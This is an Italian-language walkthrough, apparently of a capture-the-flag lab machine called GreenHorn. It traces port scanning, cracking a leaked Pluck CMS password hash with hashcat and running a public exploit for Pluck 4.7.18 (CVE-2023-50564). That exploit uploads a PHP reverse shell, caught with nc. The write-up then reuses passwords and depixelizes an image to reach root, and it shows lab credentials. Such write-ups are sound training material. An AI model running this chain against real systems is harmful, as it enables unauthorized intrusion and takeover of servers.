---
title: GreenHorn Walkthrough
description: GreenHorn è una macchina di difficoltà easy che sfrutta una vulnerabilità in Pluck per ottenere un'Esecuzione di Codice Remota (RCE) e dimostra poi i pericoli delle credenziali offuscate. La macchina mostra inoltre che dobbiamo prestare attenzione quando condividiamo configurazioni open-source, per assicurarci di non rivelare file contenenti password o altre informazioni che dovrebbero rimanere confidenziali.
author: dua2z3rr
date: 2025-10-29 1:00:00
categories: [Machines]
tags: ["Vulnerabilità: Remote File Inclusion", "Vulnerabilità: Weak Credentials", "Vulnerabilità: Remote Code Execution", "Vulnerabilità: Information Disclosure", "Codice: PHP"]
image: /assets/img/greenHorn/greenHorn-resized.png
---

## Enumerazione Esterna

### Nmap

Cominciamo utilizzando nmap.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.11.25 -vv -p-
<SNIP>
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3000/tcp open  ppp     syn-ack

<SNIP>

┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.11.25 -vv -p22,80,3000 -sC -sV
<SNIP>
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOp+cK9ugCW282Gw6Rqe+Yz+5fOGcZzYi8cmlGmFdFAjI1347tnkKumDGK1qJnJ1hj68bmzOONz/x1CMeZjnKMw=
|   256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZQbCc8u6r2CVboxEesTZTMmZnMuEidK9zNjkD2RGEv
80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://greenhorn.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  ppp?    syn-ack
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=8c44f9b5e0db4f78; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=87OxI61feXggBNpubNJ9Maca4v06MTc2MTc0NzA2MjIzNDAzMDc0Mg; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 29 Oct 2025 14:11:02 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=e5bb025fd04af230; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=V4F6yFyvdPnBCWyaTWwZpSkxSxs6MTc2MTc0NzA2NzcxOTI2ODc2OA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 29 Oct 2025 14:11:07 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=10/29%Time=69022075%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(GetRequest,34D8,"HTTP/1\.0\x20200\x20OK\r\nCache-Cont
SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gi
SF:tea=8c44f9b5e0db4f78;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Co
SF:okie:\x20_csrf=87OxI61feXggBNpubNJ9Maca4v06MTc2MTc0NzA2MjIzNDAzMDc0Mg;\
SF:x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Op
SF:tions:\x20SAMEORIGIN\r\nDate:\x20Wed,\x2029\x20Oct\x202025\x2014:11:02\
SF:x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"th
SF:eme-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\">\n\t<title>GreenHorn</title>\n\t<link\
SF:x20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoi
SF:R3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA
SF:6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbm
SF:hvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciL
SF:CJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAv
SF:YX")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Method\x20Not\x20Al
SF:lowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Con
SF:trol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\n
SF:Set-Cookie:\x20i_like_gitea=e5bb025fd04af230;\x20Path=/;\x20HttpOnly;\x
SF:20SameSite=Lax\r\nSet-Cookie:\x20_csrf=V4F6yFyvdPnBCWyaTWwZpSkxSxs6MTc2
SF:MTc0NzA2NzcxOTI2ODc2OA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sa
SF:meSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Wed,\x2029\x20
SF:Oct\x202025\x2014:11:07\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSP
SF:Request,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
SF:equest");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Dall'output vediamo la porta 22 e la 80 aperte. Nello scan con gli script, Nmap non è riuscito bene a classificare la porta 3000, ma penso abbia qualcosa a che fare con gitea a causa del cookie `i_like_gitea=e5bb025fd04af230`.

### HTTP

Iniziamo visitando la porta 80. Ci ritroviamo con 2 pagine, una per darci il benvenuto a GreenHorn e l'altra per dare il benvenuto al nuovo Junior. Eccole:

![Desktop View](/assets/img/greenHorn/greenHorn-1.png)

![Desktop View](/assets/img/greenHorn/greenHorn-2.png)

Vediamo in fondo ad entrambi i messaggi che il sito è **powered by pluck**.

Nel codice HTML possiamo trovare la versione di **pluck**.

![Desktop View](/assets/img/greenHorn/greenHorn-3.png)

Visitiamo la porta 3000 prima di procedere con la ricerca di un exploit.

![Desktop View](/assets/img/greenHorn/greenHorn-5.png)

Come pensavo, è una istanza di gitea.

### Ricerca exploit

![Desktop View](/assets/img/greenHorn/greenHorn-4.png)

Troviamo un exploit, però questo  funziona con delle credenziali per la admin dashboard.

### Gitea

Creiamo un account in gitea e esploriamo. Troviamo una repository pubblica.

![Desktop View](/assets/img/greenHorn/greenHorn-6.png)

Iniziamo a esplorare la repository.

Troviamo un file interessante chaiamto **security.php** in **/data/inc**

```php
<?php
/*
 * This file is part of pluck, the easy content management system
 * Copyright (c) pluck team
 * http://www.pluck-cms.org

 * Pluck is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * See docs/COPYING for the complete license.

 * This is a file that checks for hacking attempts and blocks them.
*/

//Make sure the file isn't accessed directly.
defined('IN_PLUCK') or exit('Access denied!');

/*
 * Version constant
 * This constant is defined here to allow for hooks to be added inside modules.
 * For other constants, see variables.all.php and variables.site.php
 */
define('PLUCK_VERSION', '4.7.18');

//Error reporting default is (E_ALL ^ E_NOTICE) - but use server configuration for production environment
//Uncomment next line for development (shows every possible error)
//error_reporting(-1);

//Set default timezone.
date_default_timezone_set('UTC');

/* Register Globals.
 * If Register Globals are ON, unset injected variables.
 */
if (isset($_REQUEST)) {
	foreach ($_REQUEST as $key => $value) {
		if (isset($GLOBALS[$key]))
			unset($GLOBALS[$key]);
	}
	unset($key);
}

/* Cross Site Scripting, Remote File Inclusion, etc.
 * First check if $_GET values are arrays.
 * Then check for strange characters in $_GET values.
 * All values with ".." or "\" or ":" or "<" or ">" or "&" or "=" or '"' or "?" or "*" are blocked, so that it's virtually impossible to inject any HTML-code, or external websites.
 * TODO: This is just a quick and dirty fix for the actual problem!
 */
foreach ($_GET as $get_value) {
	if (is_array($get_value) || preg_match('/\.\.|[\\\\:<>&="?*]/', $get_value))
		die ('A hacking attempt has been detected. For security reasons, we\'re blocking any code execution.');
}
unset($get_value);

/*
 * Undo magic quotes; http://php.net/manual/en/security.magicquotes.disabling.php.
 */
ini_set('magic_quotes_sybase', 0);
ini_set('magic_quotes_runtime', 0);
if (function_exists('get_magic_quotes_gpc') && @get_magic_quotes_gpc() === 1) {
	function stripslashes_deep($value) {
		$value = is_array($value) ? array_map('stripslashes_deep', $value) : stripslashes($value);
		return $value;
	}

	$_POST = array_map('stripslashes_deep', $_POST);
	$_GET = array_map('stripslashes_deep', $_GET);
	$_COOKIE = array_map('stripslashes_deep', $_COOKIE);
	$_REQUEST = array_map('stripslashes_deep', $_REQUEST);
}

/*
 * Check if we have a saved security token. If not, generate one and save it.
 */
if (!file_exists('data/settings/token.php') && is_writable('data/settings')) {
	$token = hash('sha512', uniqid(mt_rand(), true));
	$data = fopen('data/settings/token.php', 'w');
	fputs($data, '<?php $token = \''.$token.'\'; ?>');
	fclose($data);
	chmod('data/settings/token.php', 0777);
	unset($token);
}
?>
```


Questo file portebbe esserci utile per raggirare difese. Tuttavia, a noi serve una password.

Utilizzando **grep**, torvo la funzione che salva la password durante la installazione di **pluck**.

```php
function save_password($password) {
	//MD5-hash password
	$password = hash('sha512', $password);
	//Save password
	save_file('data/settings/pass.php', array('ww' => $password));
}
```

La password viene salvata in `data/settings/pass.php`

Leggiamo l'hash nel file:

```php
<?php
$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
?>
```

### Hashcat

Procediamo a crackare l'hash appena ottenuto:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $hashid -m d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163
Analyzing 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163'
[+] SHA-512 [Hashcat Mode: 1700]
[+] Whirlpool [Hashcat Mode: 6100]
[+] Salsa10 
[+] Salsa20 
[+] SHA3-512 
[+] Skein-512 
[+] Skein-1024(512) 
┌─[dua2z3rr@parrot]─[~]
└──╼ $nano hash.txt
┌─[dua2z3rr@parrot]─[~]
└──╼ $hashcat -a 0 -m 1700 hash.txt rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 3700X 8-Core Processor, 4283/8630 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163:iloveyou1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1700 (SHA2-512)
Hash.Target......: d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe...790163
Time.Started.....: Wed Oct 29 16:44:47 2025 (0 secs)
Time.Estimated...: Wed Oct 29 16:44:47 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   897.7 kH/s (1.50ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> whitetiger
Hardware.Mon.#1..: Util: 12%

Started: Wed Oct 29 16:44:21 2025
Stopped: Wed Oct 29 16:44:48 2025
```

La password è **iloveyou1** !

### Log in

Utilizziamo la password sul sito:

![Desktop View](/assets/img/greenHorn/greenHorn-7.png)

Ora che abbiamo le credenziali, possiamo provare ad utilizzare l'exploit che abbiamo trovato all'inizio!

### Exploit

Ecco l'intero procedimento per l'exploit:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $git clone https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC.git
Cloning into 'CVE-2023-50564_Pluck-v4.7.18_PoC'...
remote: Enumerating objects: 28, done.
remote: Counting objects: 100% (28/28), done.
remote: Compressing objects: 100% (28/28), done.
remote: Total 28 (delta 11), reused 3 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (28/28), 12.71 KiB | 123.00 KiB/s, done.
Resolving deltas: 100% (11/11), done.
┌─[dua2z3rr@parrot]─[~]
└──╼ $pip3 install requests requests_toolbelt --break-system-packages
Defaulting to user installation because normal site-packages is not writeable
Requirement already satisfied: requests in ./.local/lib/python3.11/site-packages (2.32.5)
Requirement already satisfied: requests_toolbelt in /usr/lib/python3/dist-packages (0.10.1)
Requirement already satisfied: charset_normalizer<4,>=2 in /usr/lib/python3/dist-packages (from requests) (3.0.1)
Requirement already satisfied: idna<4,>=2.5 in /usr/lib/python3/dist-packages (from requests) (3.3)
Requirement already satisfied: urllib3<3,>=1.21.1 in /usr/lib/python3/dist-packages (from requests) (1.26.12)
Requirement already satisfied: certifi>=2017.4.17 in /usr/lib/python3/dist-packages (from requests) (2022.9.24)
┌─[dua2z3rr@parrot]─[~]
└──╼ $cd CVE-2023-50564_Pluck-v4.7.18_PoC/
┌─[dua2z3rr@parrot]─[~/CVE-2023-50564_Pluck-v4.7.18_PoC]
└──╼ $nano poc.py
┌─[dua2z3rr@parrot]─[~/CVE-2023-50564_Pluck-v4.7.18_PoC]
└──╼ $nano poc.py
┌─[dua2z3rr@parrot]─[~/CVE-2023-50564_Pluck-v4.7.18_PoC]
└──╼ $ls -al
total 16
drwxr-xr-x 1 dua2z3rr dua2z3rr   70 29 ott 16.50 .
drwxr-xr-x 1 dua2z3rr dua2z3rr 2996 29 ott 16.44 ..
drwxr-xr-x 1 dua2z3rr dua2z3rr  138 29 ott 15.46 .git
-rw-r--r-- 1 dua2z3rr dua2z3rr 1067 29 ott 15.46 LICENSE
-rw-r--r-- 1 dua2z3rr dua2z3rr 1593 29 ott 16.50 poc.py
-rw-r--r-- 1 dua2z3rr dua2z3rr 1816 29 ott 15.46 README.md
-rw-r--r-- 1 dua2z3rr dua2z3rr 2693 29 ott 15.46 shell.rar
┌─[dua2z3rr@parrot]─[~/CVE-2023-50564_Pluck-v4.7.18_PoC]
└──╼ $cd ..
┌─[dua2z3rr@parrot]─[~]
└──╼ $cd php-reverse-shell/
┌─[dua2z3rr@parrot]─[~/php-reverse-shell]
└──╼ $ls -al
total 60
drwxr-xr-x 1 dua2z3rr dua2z3rr   172 24 ott 18.49 .
drwxr-xr-x 1 dua2z3rr dua2z3rr  2996 29 ott 16.44 ..
-rw-r--r-- 1 dua2z3rr dua2z3rr    62 25 set 22.22 CHANGELOG
-rw-r--r-- 1 dua2z3rr dua2z3rr 17987 25 set 22.22 COPYING.GPL
-rw-r--r-- 1 dua2z3rr dua2z3rr   308 25 set 22.22 COPYING.PHP-REVERSE-SHELL
drwxr-xr-x 1 dua2z3rr dua2z3rr   138 25 set 22.22 .git
-rw-r--r-- 1 dua2z3rr dua2z3rr 18047 25 set 22.22 LICENSE
-rwxr-xr-x 1 dua2z3rr dua2z3rr  5492 24 ott 18.49 php-reverse-shell.php
-rw-r--r-- 1 dua2z3rr dua2z3rr    20 25 set 22.22 README.md
┌─[dua2z3rr@parrot]─[~/php-reverse-shell]
└──╼ $nano php-reverse-shell.php #modifico valori
┌─[dua2z3rr@parrot]─[~/php-reverse-shell]
└──╼ $cp php-reverse-shell.php ../CVE-2023-50564_Pluck-v4.7.18_PoC/shell.php
┌─[dua2z3rr@parrot]─[~/php-reverse-shell]
└──╼ $cd ../CVE-2023-50564_Pluck-v4.7.18_PoC/
┌─[dua2z3rr@parrot]─[~/CVE-2023-50564_Pluck-v4.7.18_PoC]
└──╼ $ls -al
total 24
drwxr-xr-x 1 dua2z3rr dua2z3rr   88 29 ott 16.52 .
drwxr-xr-x 1 dua2z3rr dua2z3rr 2996 29 ott 16.44 ..
drwxr-xr-x 1 dua2z3rr dua2z3rr  138 29 ott 15.46 .git
-rw-r--r-- 1 dua2z3rr dua2z3rr 1067 29 ott 15.46 LICENSE
-rw-r--r-- 1 dua2z3rr dua2z3rr 1593 29 ott 16.50 poc.py
-rw-r--r-- 1 dua2z3rr dua2z3rr 1816 29 ott 15.46 README.md
-rwxr-xr-x 1 dua2z3rr dua2z3rr 5494 29 ott 16.52 shell.php
-rw-r--r-- 1 dua2z3rr dua2z3rr 2693 29 ott 15.46 shell.rar
```

Ora mettiamo in una zip **shell.php** chiamata payload.zip

```shell
┌─[dua2z3rr@parrot]─[~/CVE-2023-50564_Pluck-v4.7.18_PoC]
└──╼ $python3 poc.py 
ZIP file path: ./payload.zip
Login successful
ZIP file uploaded successfully.
```

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nc -lnvp 9003
Listening on 0.0.0.0 9003
Connection received on 10.10.11.25 48564
Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 15:56:24 up  2:02,  0 users,  load average: 0.05, 0.03, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1097): Inappropriate ioctl for device
bash: no job control in this shell
www-data@greenhorn:/$ whoami
whoami
www-data
```

## Shell come www-data

### Enumerazione Interna

Cominciamo con enumerare la directory **/home**.

```shell
www-data@greenhorn:/$ cd home
cd home
www-data@greenhorn:/home$ ls -al
ls -al
total 16
drwxr-xr-x  4 root   root   4096 Jun 20  2024 .
drwxr-xr-x 20 root   root   4096 Jun 20  2024 ..
drwxr-x---  2 git    git    4096 Jun 20  2024 git
drwxr-xr-x  3 junior junior 4096 Jun 20  2024 junior
www-data@greenhorn:/home$ cd ju	
cd junior/
www-data@greenhorn:/home/junior$ ls -al
ls -al
total 76
drwxr-xr-x 3 junior junior  4096 Jun 20  2024 .
drwxr-xr-x 4 root   root    4096 Jun 20  2024 ..
lrwxrwxrwx 1 junior junior     9 Jun 11  2024 .bash_history -> /dev/null
drwx------ 2 junior junior  4096 Jun 20  2024 .cache
-rw-r----- 1 root   junior 61367 Jun 11  2024 Using OpenVAS.pdf
-rw-r----- 1 root   junior    33 Oct 29 13:54 user.txt
```

Vediamo un file pdf che parla di **OpenVAS**, un vulnerability scanner open source.

Proviamo a cambiare utente con la password che abbiamo crackato prima.

```shell
www-data@greenhorn:/$ su - junior
su - junior
Password: iloveyou1
ls
user.txt
Using OpenVAS.pdf
```

## Shell come Junior

### Enumerazione interna

Prima di tutto, mettiamo le mani su **Using OpenVAS.pdf**, il quale è molto sospetto. Ecco cosa contiene:

![Desktop View](/assets/img/greenHorn/greenHorn-8.png)

La password è pixellata. Cerchiamo un tool per leggere questi pixel.


Questo tool sembra fare al caso nostro: <https://github.com/spipm/Depixelization_poc.git>.

```shell
python3 depix.py -p <PATHTOIMAGE>/image.png -s
./images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o
<DESIREDPATH>/output.png
```

Ecco la password: **sidefromsidetheothersidesidefromsidetheotherside**

> Assicuratevi di prendere una buona immagine solamente del testo pixellato, oppure non funzionerà!
{: .prompt-warning }

```shell
www-data@greenhorn:/$ su root
su root
Password: sidefromsidetheothersidesidefromsidetheotherside
whoami
root
```

Prendiamo la root flag e terminiamo la box.
